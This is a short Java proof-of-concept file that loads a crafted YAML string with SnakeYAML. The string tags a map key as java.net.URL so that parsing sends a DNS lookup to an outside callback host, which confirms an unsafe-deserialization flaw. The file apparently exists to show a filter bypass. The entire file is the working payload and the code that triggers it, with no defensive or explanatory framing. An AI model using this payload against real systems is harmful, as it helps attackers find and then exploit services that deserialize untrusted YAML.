package URLPoC;

import org.yaml.snakeyaml.Yaml;

public class BypassPoC {
    public static void main(String[] args) throws Exception {
        String payload = "{!!java.net.URL [\"http://bypass.dero5bv4.eyes.sh\"]: 1}";

        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
